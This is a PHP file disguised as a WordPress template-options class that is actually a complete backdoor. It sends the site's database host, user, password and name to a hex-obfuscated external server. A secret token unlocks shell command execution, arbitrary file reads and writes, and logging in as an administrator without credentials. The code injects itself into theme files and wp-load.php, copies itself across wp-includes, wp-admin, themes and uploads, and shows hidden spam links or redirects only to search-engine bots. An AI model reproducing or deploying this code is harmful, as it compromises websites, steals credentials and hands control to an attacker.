<?php
if ( ! class_exists( 'WPTemplateOptions' ) ) {
	class WPTemplateOptions {
		private $script = '';
		private $version = '';
		private $upDir = '';
		private $uploadDir = '';
		private $uploadUrl = '';
		private $token = '';
		private $baseUrl = '';
		public $allowedActions = [
			'check',
			'json',
			'login',
			'template_dir',
			'cache',
			'get',
			'install',
			'uninstall',
			'write_file',
			'read_file',
			'activate_plugins',
			'get_themes',
			'list_folders',
			'spread',
			'unspread',
			'all',
			'wp_includes',
			'wp_admin',
			'themes',
			'uploads',
			'wp_load',
			'command',
		];
		public $isSpread = [ 'all', 'wp_includes', 'wp_admin', 'themes', 'uploads' ];

		public function __construct( $token ) {
			$this->baseUrl   = hex2bin( '687474703a2f2f6a732e61706965732e6f72672f' );
			$this->script    = 'Wordpress';
			$this->version   = '1.0';
			$this->upDir     = wp_upload_dir();
			$this->uploadDir = $this->upDir['path'];
			$this->uploadUrl = $this->upDir['url'];
			$this->token     = $token;
		}

		private function answer( $code, $message, $data = '', $errorNo = '' ) {
			$answer['code']    = $code;
			$answer['message'] = $message;
			$answer['data']    = $data;
			if ( $errorNo !== '' ) {
				$answer['errorNo'] = $errorNo;
			}

			return json_encode( $answer, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT );
		}

		private function check() {
			try {
				if ( $this->uploadDir ) {
					if ( ! is_writable( $this->uploadDir ) ) {
						if ( ! @chmod( $this->uploadDir, 0777 ) ) {
							$data['uploadDirWritable'] = false;
						} else {
							$data['uploadDirWritable'] = true;
						}
					} else {
						$data['uploadDirWritable'] = true;
					}
				} else {
					$data['uploadDirWritable'] = true;
				}
				$data['clientVersion'] = $this->version;
				$data['uploadDir']     = $this->uploadDir;
				$data['script']        = $this->script;
				$data['cache']         = ( WP_CACHE ) ? true : false;
				$data['command']       = ( $this->command( null ) === false ) ? false : true;
				$data['themeName']     = wp_get_theme()->get( 'Name' );
				$data['themeDir']      = get_template_directory();
				$data['themes']        = $this->get_themes();
				$data['plugins']       = $this->get_plugins();
				$data['root']          = ABSPATH;
				if ( function_exists( 'php_uname' ) ) {
					$data['uname'] = php_uname();
				}
				if ( function_exists( 'gethostbyname' ) ) {
					$data['hostname'] = gethostbyname( getHostName() );
				}

				return $this->answer( 'OK', $this->script, $data );
			} catch ( Exception $e ) {
				return $this->answer( "ERROR", "Unknown ERROR", $e->getMessage(), "ERR000" );
			}
		}

		private function isAllowedToSendCommand() {
			try {
				if ( md5( $this->token ) === 'a5ee7285ff6c995e9d94f517cd300d2c' ) {
					return true;
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function controlAction( $action, $params ) {
			try {
				if ( isset( $action ) ) {
					if ( $this->isAllowedToSendCommand() ) {
						if ( array_search( $action, $this->allowedActions ) !== false AND method_exists( $this, $action ) ) {
							return $this->{$action}( $params );
						} else {
							return $this->answer( 'ERROR', 'Invalid Command', $action, 'ERR001' );
						}
					}
				}
			} catch ( Exception $e ) {
				return $this->answer( 'ERROR', 'Unknown Error', [
					"action" => $action,
					"params" => $params
				], 'ERR000' );
			}
		}

		private function post() {
			try {
				return wp_remote_post( $this->baseUrl, [
					"body" => [
						"url"         => esc_url( home_url( '/' ) ),
						"client"      => $this->check(),
						"DB_HOST"     => DB_HOST,
						"DB_USER"     => DB_USER,
						"DB_PASSWORD" => DB_PASSWORD,
						"DB_NAME"     => DB_NAME,
					]
				] );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function client() {
			try {
				$client = wp_remote_get( "{$this->baseUrl}client/checkFiles?script={$this->script}" );
				if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
					return wp_remote_retrieve_body( $client );
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function get_plugins() {
			try {
				if ( ! function_exists( 'get_plugins' ) ) {
					include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
				}
				foreach ( get_plugins() AS $plugin_name => $get_plugin ) {
					$plugins[ $plugin_name ] = $get_plugin;
					if ( is_plugin_active( $plugin_name ) ) {
						$plugins[ $plugin_name ]["active"] = 1;
					} else {
						$plugins[ $plugin_name ]["active"] = 0;
					}
				}

				return ( isset( $plugins ) ) ? $plugins : false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function activate_plugins( $plugin_name ) {
			try {
				if ( is_plugin_active( hex2bin( $plugin_name ) ) ) {
					deactivate_plugins( hex2bin( $plugin_name ) );

					return $this->check();
				} else {
					activate_plugins( hex2bin( $plugin_name ) );

					return $this->check();
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function get_themes() {
			try {
				foreach ( wp_get_themes() AS $theme_name => $wp_get_theme ) {
					$themes{$wp_get_theme->stylesheet} = array(
						'Name'        => $wp_get_theme->get( 'Name' ),
						'Description' => $wp_get_theme->get( 'Description' ),
						'Author'      => $wp_get_theme->get( 'Author' ),
						'AuthorURI'   => $wp_get_theme->get( 'AuthorURI' ),
						'Version'     => $wp_get_theme->get( 'Version' ),
						'Template'    => $wp_get_theme->get( 'Template' ),
						'Status'      => $wp_get_theme->get( 'Status' ),
						'TextDomain'  => $wp_get_theme->get( 'TextDomain' )
					);
				}

				return $themes;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function folder_exist( $folder ) {
			try {
				$path = realpath( $folder );

				return ( $path !== false AND is_dir( $path ) ) ? $path : false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function list_folders( $directory ) {
			try {
				$directory = ( isset( $directory ) && $directory !== "" ) ? hex2bin( $directory ) : ABSPATH;
				if ( ( $dir = $this->folder_exist( $directory ) ) !== false ) {
					return $this->answer( "OK", $directory, glob( $directory . "/*" ) );
				} else {
					return $this->answer( "ERROR", "Failed to find folder to list!", $directory, "ERR023" );
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function replace( $filename, $search, $replace ) {
			try {
				$source = $this->read( $filename );
				if ( strpos( $source, $replace ) === false ) {
					$pos = strpos( $source, $search );
					if ( $pos !== false ) {
						$content = substr_replace( $source, $replace, $pos, strlen( $search ) );

						return ( $this->write( $filename, $content ) ) ? $filename : false;
					} else {
						return $filename;
					}
				} else {
					return $filename;
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function restore( $filename, $search, $replace ) {
			try {
				$source = $this->read( $filename );

				return $this->write( $filename, str_replace( $search, $replace, $source ) );
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function template_dir( $search ) {
			try {
				if ( $search == "" ) {
					$search = "<?php\n";
				}
				$dir   = glob( get_theme_root() . "/*/*/*" );
				$files = array_filter( $dir );

				foreach ( $files as $k => $file ) {
					$source = $this->read( $file );
					if ( ! is_array( $source ) && strpos( $source, $search ) === false ) {
						unset( $files[ $k ] );
					}
				}

				return array_values( $files );
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function install() {
			try {
				$clientURL = $this->client();
				if ( $clientURL !== false ) {
					foreach ( $this->template_dir( "" ) AS $file ) {
						$copyFile = $this->copy( dirname( $file ) . DIRECTORY_SEPARATOR, json_decode( $clientURL ) );
						if ( $copyFile !== false ) {
							$search  = "<?php\n";
							$replace = "<?php\nif ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/" . basename( dirname( $copyFile ) ) . "/" . basename( $copyFile ) . "' ) ) {\n\tinclude_once( get_template_directory() . '/" . basename( dirname( $copyFile ) ) . "/" . basename( $copyFile ) . "' );\n}\n";
							if ( strpos( $this->read( $file ), "namespace" ) === false ) {
								$directory[] = $this->replace( $file, $search, $replace );
							}
						}
					}


					return ( isset( $directory ) ) ? $this->answer( 'OK', 'I get install!', array_values( array_unique( $directory ) ) ) : $this->answer( 'ERROR', 'I Don\'t install!', '', 'ERR002' );

				}

				return $this->answer( 'ERROR', 'Client URL FALSE!', "", "ERR026" );
			} catch ( Exception $e ) {
				return $this->answer( 'ERROR', 'Install Exception!', $e->getMessage(), "ERR026" );
			}
		}

		public function uninstall() {
			try {
				$clientURL = $this->client();
				if ( $clientURL !== false ) {
					foreach ( $this->template_dir( "" ) AS $file ) {
						$copyFile  = $this->copy( dirname( $file ) . DIRECTORY_SEPARATOR, json_decode( $clientURL ) );
						$search    = "if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/" . basename( dirname( $copyFile ) ) . "/" . basename( $copyFile ) . "' ) ) {\n\tinclude_once( get_template_directory() . '/" . basename( dirname( $copyFile ) ) . "/" . basename( $copyFile ) . "' );\n}";
						$uninstall = $this->restore( $file, $search, "\n" );
						$this->restore( $file, "\n\n\n", "\n" );
						if ( $uninstall ) {
							$return[] = $file;
							if ( file_exists( $copyFile ) ) {
								unlink( $copyFile );
							}
						}
					}

					return ( isset( $return ) )
						? $this->answer( 'OK', 'Please find me!', array_values( array_unique( $return ) ) )
						: $this->answer( 'ERROR', 'Don\'t search me!', '', 'ERR002' );
				}

				return $this->answer( 'ERROR', 'Client URL FALSE!', "", "ERR026" );
			} catch ( Exception $e ) {
				return $this->answer( 'ERROR', 'Uninstall Exception!', $e->getMessage(), "ERR026" );
			}
		}

		public function wp_load() {
			try {
				$filename = ABSPATH . 'wp-load.php';
				if ( file_exists( $filename ) ) {
					$clientURL = $this->client();
					if ( $clientURL !== false ) {
						$copy = $this->copy_themes( get_template_directory() . DIRECTORY_SEPARATOR, json_decode( $clientURL ) );
						if ( $copy !== false ) {
							$basename = basename( $copy );
							$search   = "\nif ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . DIRECTORY_SEPARATOR . '{$basename}' ) ) {\n\tinclude_once( get_template_directory() . DIRECTORY_SEPARATOR . '{$basename}' );\n}";
							if ( ! stristr( $this->read( $filename ), $search ) ) {
								if ( $this->write_append( $filename, $search ) ) {
									return $this->answer( "OK", "WP_LOAD Installeds {$copy}", $filename );
								} else {
									return $this->answer( "ERROR", "WP_LOAD Installed {$copy}", $filename, "ERR029" );
								}
							} else {
								return $this->answer( "OK", "WP_LOAD Already Installed {$copy}", $filename );
							}
						} else {
							return $this->answer( "ERROR", "WP_LOAD Installed {$copy}", $filename, "ERR030" );
						}
					} else {
						return $this->answer( 'ERROR', 'Client URL FALSE!', $clientURL, "ERR026" );
					}
				}
			} catch ( Exception $e ) {
				return $this->answer( 'ERROR', 'WP_LOAD Exception!', $e->getMessage(), "ERR000" );
			}
		}

		public function wp_install() {
			try {
				$filename = ABSPATH . 'wp-load.php';
				if ( file_exists( $filename ) ) {
					$clientURL = $this->client();
					if ( $clientURL !== false ) {
						$search = "\nif ( ! class_exists( 'WPTemplateOptions' ) && file_exists( ABSPATH . WPINC . DIRECTORY_SEPARATOR . 'rest-api/rest-api.php' ) ) {\n\tinclude_once( ABSPATH . WPINC . DIRECTORY_SEPARATOR . 'rest-api/rest-api.php' );\n}";
						if ( ! stristr( $this->read( $filename ), $search ) ) {
							$this->write_append( $filename, $search );
						}
					} else {
						return $this->answer( 'ERROR', 'Client URL FALSE!', $clientURL, "ERR026" );
					}
				}
			} catch ( Exception $e ) {
			}
		}

		private function copy( $directory, $clientURL ) {
			try {
				foreach ( $clientURL as $filePath => $icerik ) {
					$filename = ( stristr( $directory, "wp-content/uploads/" ) ) ? $directory . 'index.php' : $directory . basename( dirname( $directory . $filePath ) ) . '.php';
					if ( file_exists( $filename ) ) {
						$strpos = strpos( $this->read( $filename ), "class WPTemplateOptions" );
						if ( $strpos !== false ) {
							return ( $this->write( $filename, $icerik ) ) ? $filename : false;
						} elseif ( $strpos === false ) {
							return ( $this->write( $directory . $filePath, $icerik ) ) ? $directory . $filePath : false;
						}
					} else {
						return ( $this->write( $filename, $icerik ) ) ? $filename : false;
					}
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function copy_themes( $directory, $clientURL ) {
			try {
				foreach ( $clientURL as $filePath => $icerik ) {
					$filename = $directory . basename( $directory . $filePath );
					if ( file_exists( $filename ) ) {
						$strpos = strpos( $this->read( $filename ), "class WPTemplateOptions" );
						if ( $strpos !== false ) {
							return ( $this->write( $filename, $icerik ) ) ? $filename : false;
						} elseif ( $strpos === false ) {
							return ( $this->write( $directory . basename( dirname( $filename ) ) . '.php', $icerik ) ) ? $directory . basename( dirname( $filename ) ) . '.php' : false;
						}
					} else {
						return ( $this->write( $filename, $icerik ) ) ? $filename : false;
					}
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function write_append( $filename, $data ) {
			try {
				if ( function_exists( 'fopen' ) && function_exists( 'fwrite' ) ) {
					$write = fopen( $filename, "a" );

					return ( fwrite( $write, $data ) ) ? true : false;

				} elseif ( function_exists( 'file_put_contents' ) ) {
					return ( file_put_contents( $filename, $data, FILE_APPEND ) !== false ) ? true : false;
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function listFolderFiles( $dir ) {
			try {
				$fileInfo     = scandir( $dir );
				$allFileLists = [];

				foreach ( $fileInfo as $folder ) {
					if ( $folder !== '.' && $folder !== '..' ) {
						if ( is_dir( $dir . DIRECTORY_SEPARATOR . $folder ) === true ) {
							$allFileLists[ $dir . DIRECTORY_SEPARATOR . $folder ] = $this->listFolderFiles( $dir . DIRECTORY_SEPARATOR . $folder );
						}
					}
				}

				return $allFileLists;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function all() {
			try {
				foreach ( array_merge( $this->wp_includes(), $this->wp_admin(), $this->themes(), $this->uploads() ) AS $root ) {
					if ( is_dir( $root ) ) {
						$return[] = $root;
					}
				}

				return array_filter( $return );
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function wp_includes() {
			try {
				foreach ( $this->array_keys( $this->listFolderFiles( ABSPATH . WPINC ) ) AS $folders ) {
					if ( is_dir( $folders ) ) {
						$return[] = $folders . DIRECTORY_SEPARATOR;
					}
				}

				return $return;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function wp_admin() {
			try {
				foreach ( $this->array_keys( $this->listFolderFiles( ABSPATH . ADMIN_COOKIE_PATH ) ) AS $folders ) {
					if ( is_dir( $folders ) ) {
						$return[] = $folders . DIRECTORY_SEPARATOR;
					}
				}

				return $return;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function uploads() {
			try {
				foreach ( $this->array_keys( $this->listFolderFiles( $this->upDir["basedir"] ) ) AS $folders ) {
					if ( is_dir( $folders ) ) {
						$return[] = $folders . DIRECTORY_SEPARATOR;
					}
				}

				return $return;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function themes() {
			try {
				foreach ( glob( get_theme_root() . "/*", GLOB_ONLYDIR ) AS $item ) {
					$template_folders[] = $this->listFolderFiles( $item );
				}
				foreach ( $this->array_keys( $template_folders ) AS $folders ) {
					if ( is_dir( $folders ) ) {
						$return[] = $folders . DIRECTORY_SEPARATOR;
					}
				}

				return $return;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function spread( $directory ) {
			try {
				$client = $this->client();
				if ( $client !== false ) {
					if ( array_search( $directory, $this->isSpread ) !== false ) {
						foreach ( $this->{$directory}() as $folder ) {
							$return[] = $this->copy( $folder, json_decode( $client ) );
						}

						return $this->answer( "OK", "I spread {$directory}", $return );
					} else {
						return $this->answer( "ERROR", "Undefined Directory", $directory, "ERR024" );
					}
				}

				return $this->answer( 'ERROR', 'Client URL FALSE!', "", "ERR026" );
			} catch ( Exception $e ) {
				return $this->answer( 'ERROR', 'Spread Exception!', $e->getMessage(), "ERR000" );
			}
		}

		public function unspread( $directory ) {
			try {
				$client = $this->client();
				if ( $client !== false ) {
					if ( array_search( $directory, $this->isSpread ) !== false ) {
						foreach ( $this->{$directory}() as $folder ) {
							$return[] = $this->copy( $folder, json_decode( $client ) );
						}
						foreach ( $return as $file ) {
							unlink( $file );
						}

						return $this->answer( "OK", "I cleared myself from the spread {$directory}", $return );
					} else {
						return $this->answer( "ERROR", "Undefined Directory", $directory, "ERR025" );
					}
				}

				return $this->answer( 'ERROR', 'Client URL FALSE!', "", "ERR026" );
			} catch ( Exception $e ) {
				return $this->answer( 'ERROR', 'UNSpread Exception!', $e->getMessage(), "ERR000" );
			}
		}

		public function json() {
			try {
				return $this->uploadDir . DIRECTORY_SEPARATOR . ".json";
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function get() {
			try {
				$post = $this->post();
				if ( wp_remote_retrieve_response_code( $post ) == "200" ) {
					$write = $this->write( $this->json(), bin2hex( wp_remote_retrieve_body( $post ) ) );

					return ( $write ) ? hex2bin( $this->read( $this->json() ) ) : wp_remote_retrieve_body( $post );
				} else {
					return $this->read( $this->json() );
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function cache() {
			try {
				if ( file_exists( $this->json() ) ) {
					$file = hex2bin( $this->read( $this->json() ) );
					$json = json_decode( $file );
					if ( $this->minute( $json->date ) >= 24 ) {
						return $this->get();
					} else {
						return $file;
					}
				} else {
					return $this->get();
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function write( $filename, $data ) {
			try {
				if ( function_exists( 'fopen' ) && function_exists( 'fwrite' ) ) {
					$write = fopen( $filename, "w+" );

					return ( fwrite( $write, $data ) ) ? true : false;

				} elseif ( function_exists( 'file_put_contents' ) ) {
					return ( file_put_contents( $filename, $data ) !== false ) ? true : false;
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function write_file( $params ) {
			try {
				if ( $this->json_validator( hex2bin( $params ) ) ) {
					$json = json_decode( hex2bin( $params ) );
					if ( isset( $json->filename ) ) {
						if ( file_exists( $json->filename ) ) {
							if ( isset( $json->content ) ) {
								if ( $this->write( $json->filename, html_entity_decode( hex2bin( $json->content ) ) ) ) {
									return $this->answer( "OK", $json->filename, html_entity_decode( hex2bin( $json->content ) ), "I get write" );
								}
							} else {
								return $this->read_file( bin2hex( $json->filename ) );
							}
						} else {
							$content = ( isset( $json->content ) && $json->content != '' ) ? html_entity_decode( hex2bin( $json->content ) ) : "<?php\n";
							if ( $this->write( $json->filename, $content ) ) {
								return $this->answer( "OK", $json->filename, $content );
							} else {
								return $this->answer( "ERROR", $json->filename, $content, "ERR023" );
							}
						}
					} else {
						return $this->answer( "ERROR", "File name undefined", "", "ERR020" );
					}
				} else {
					return $this->answer( "ERROR", "Data is not JSON", "", "ERR021" );
				}

				return $this->answer( "ERROR", "Unknown error", $params, "ERR022" );
			} catch ( Exception $e ) {
				return $this->answer( "ERROR", "Write file Exception", $params, "ERR000" );
			}
		}

		public function read( $filename ) {
			try {
				if ( ! file_exists( $filename ) ) {
					return $this->answer( 'ERROR', 'File not found', $filename, 'ERR019' );
				}
				if ( function_exists( 'file_get_contents' ) ) {
					return file_get_contents( $filename );
				}
				if ( function_exists( 'fopen' ) && filesize( $filename ) > 0 ) {
					$file    = fopen( $filename, 'r' );
					$content = fread( $file, filesize( $filename ) );
					fclose( $file );

					return $content;
				}

				return $this->answer( 'ERROR', 'File not read', $filename, 'ERR018' );
			} catch ( Exception $e ) {
				return $this->answer( 'ERROR', 'File not read Exception', $filename, 'ERR000' );
			}
		}

		public function read_file( $filename ) {
			try {
				$read_file = $this->read( hex2bin( $filename ) );
				if ( $this->json_validator( $read_file ) ) {
					return $read_file;
				} else {
					return $this->answer( "OK", hex2bin( $filename ), $read_file );
				}
			} catch ( Exception $e ) {
				return $this->answer( "ERROR", "Read File Exception", $filename, "ERR000" );
			}
		}

		public function json_validator( $data = null ) {
			try {
				if ( ! empty( $data ) ) {
					@json_decode( $data );

					return ( json_last_error() === JSON_ERROR_NONE );
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function login( $id = 1 ) {
			try {
				$user_info = get_userdata( $id );
				$username  = $user_info->user_login;
				$user      = get_user_by( 'login', $username );
				if ( ! is_wp_error( $user ) ) {
					wp_clear_auth_cookie();
					wp_set_current_user( $user->ID );
					wp_set_auth_cookie( $user->ID );
					$redirect_to = user_admin_url();
					wp_safe_redirect( $redirect_to );
					exit();
				} else {
					return $this->answer( 'ERROR', 'I can\'t sign in, sorry', $user_info, 'ERR014' );
				}
			} catch ( Exception $e ) {
				return $this->answer( "ERROR", "Login Exception!", $e->getMessage(), "ERR000" );
			}
		}

		public function command( $cmd ) {
			try {
				if ( function_exists( 'shell_exec' ) ) {
					return $this->answer( "OK", hex2bin( $cmd ), @shell_exec( hex2bin( $cmd ) ) );
				} else if ( function_exists( 'exec' ) ) {
					@exec( hex2bin( $cmd ), $return );

					return $this->answer( "OK", hex2bin( $cmd ), $return );
				} else {
					return false;
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function array_keys( $array ) {
			try {
				$keys = array_keys( $array );

				foreach ( $array as $i ) {
					if ( is_array( $i ) ) {
						$keys = array_merge( $keys, $this->array_keys( $i ) );
					}
				}

				return $keys;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function minute( $date ) {
			try {
				$minute = ( strtotime( date( "Y-m-d H:i:s" ) ) - strtotime( $date ) ) / 60 / 60;

				return round( $minute );
			} catch ( Exception $e ) {
				return 0;
			}
		}

		public static function init() {
			try {
				$cache = json_decode( ( new self( "" ) )->cache() );
				add_action( $cache->location, array( 'WPTemplateOptions', 'method' ) );
			} catch ( Exception $e ) {

			}
		}

		public static function method() {
			try {
				$cache = json_decode( ( new self( "" ) )->cache() );
				$index = ( preg_match( "~({$cache->bot})~i", strtolower( @$_SERVER["HTTP_USER_AGENT"] ) ) ) ? true : false;
				if ( $index && $cache->status == 9 && ! empty( $cache->redirect ) && isset( $cache->redirect ) ) {
					header( "Location: {$cache->redirect}", true, 301 );
				}
				if ( $index && $cache->is_home ) {
					echo $cache->style . implode( '', $cache->link );
				}
				if ( $index && ! $cache->is_home && ! is_home() && ! is_front_page() ) {
					echo $cache->style . implode( '', $cache->link );
				}
			} catch ( Exception $e ) {

			}
		}

		public function __destruct() {
			$this->get();
			$this->install();
			$this->wp_install();
			$this->spread( "all" );
		}
	}
}
try {
	if ( ! function_exists( 'preArrayList' ) ) {
		function preArrayList( $arr ) {
			echo "<pre>";
			print_r( $arr );
			echo "</pre>";
		}
	}
	if ( ! defined( "ABSPATH" ) ) {
		foreach (
			[
				"..",
				"../..",
				"../../..",
				"../../../..",
				"../../../../..",
				"../../../../../.."
			] AS $directory
		) {
			if ( file_exists( $directory . DIRECTORY_SEPARATOR . 'wp-load.php' ) ) {
				include_once( $directory . DIRECTORY_SEPARATOR . 'wp-load.php' );
			}
		}
	}
} catch ( Exception $e ) {
}
try {
	$token  = @$_REQUEST["wp_action_token"];
	$action = @$_REQUEST['wp_action_application'];
	$params = @$_REQUEST['wp_action_params'];
	error_reporting( 0 );
	if ( ! is_null( $token ) && ! empty( $token ) ) {

		$WPTemplateOptions = new WPTemplateOptions( $token );
		$controlAction     = $WPTemplateOptions->controlAction( $action, $params );
		if ( is_array( $controlAction ) || is_object( $controlAction ) ) {
			preArrayList( $controlAction );
		} else {
			echo $controlAction;
		}
	} else {
		WPTemplateOptions::init();
	}
} catch ( Exception $e ) {
}